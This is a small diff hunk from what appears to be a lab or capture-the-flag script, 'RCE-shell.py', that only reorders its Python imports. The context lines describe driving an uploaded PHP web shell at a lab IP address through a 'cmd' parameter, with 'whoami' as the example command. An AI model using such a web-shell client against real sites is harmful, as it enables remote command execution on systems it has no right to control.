@@ -4,8 +4,9 @@
 # Proof of Concept: Call the php file from your browser with `http://..../file.php?cmd=whoami`
 # before use: in code, adapt the `url` to match the attacked site + filename. Then run `python3 RCE-shell.py`. 
 
-import requests
 import urllib.parse
+
+import requests
 
 url = 'http://10.10.171.162/bootstrap/img/file.php?cmd='
 
